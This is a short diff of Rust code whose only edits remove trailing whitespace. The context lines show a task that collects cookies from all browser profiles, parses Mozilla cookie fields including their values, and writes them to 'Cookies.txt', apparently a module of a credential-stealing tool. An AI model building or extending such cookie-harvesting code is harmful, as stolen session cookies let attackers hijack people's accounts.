@@ -26,7 +26,7 @@ impl<'a> CookiesTask<'a> {
 
 impl Task for CookiesTask<'_> {
     parent_name!("Cookies.txt");
-    
+
     unsafe fn run(&self, parent: &Path) {
         let Some(cookies) = collect_from_all_profiles(
             &self.browser.profiles,
@@ -34,7 +34,7 @@ impl Task for CookiesTask<'_> {
         ) else {
             return
         };
-        
+
         let _ = to_string_and_write_all(&cookies, "\n", parent);
     }
 }
@@ -50,7 +50,7 @@ fn extract_cookies_from_record(record: &dyn TableRecord) -> Option<Cookie> {
     let path = record.get_value(MOZ_COOKIES_PATH)?.as_string()?.to_owned();
     let expires = record.get_value(MOZ_COOKIES_EXPIRY)?.as_integer()?.to_owned();
     let value = record.get_value(MOZ_COOKIES_VALUE)?.as_string()?.to_owned();
-    
+
     Some(Cookie {
         host_key,
         name,
